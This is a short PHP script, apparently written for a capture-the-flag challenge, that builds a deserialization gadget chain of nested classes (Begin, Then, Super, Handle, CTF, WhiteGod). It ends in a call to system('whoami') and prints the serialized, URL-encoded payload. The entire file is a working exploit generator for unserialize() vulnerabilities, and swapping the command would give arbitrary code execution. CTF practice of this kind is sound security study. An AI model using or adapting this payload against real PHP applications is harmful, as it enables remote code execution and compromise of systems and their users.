<?php
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: ../../login.php");
    exit();
}
class Begin{
    public $name;
}

class Then{
    private $func;
    public function __construct(){
        $this->func = new Super();
    }
}

class Handle{
    protected $obj;
    public function __construct(){
        $this->obj = new CTF();
    }           
}

class Super{
    protected $obj;
    public function __construct(){
        $this->obj = new Handle();
    }        
}
class CTF{
    public $handle;
    public function __construct(){
        $this->handle = new WhiteGod();
    }
}

class WhiteGod{
    public $func="system";
    public $var="whoami";
}
$begin = new begin();
$begin ->name = new Then();
echo urlencode(serialize($begin));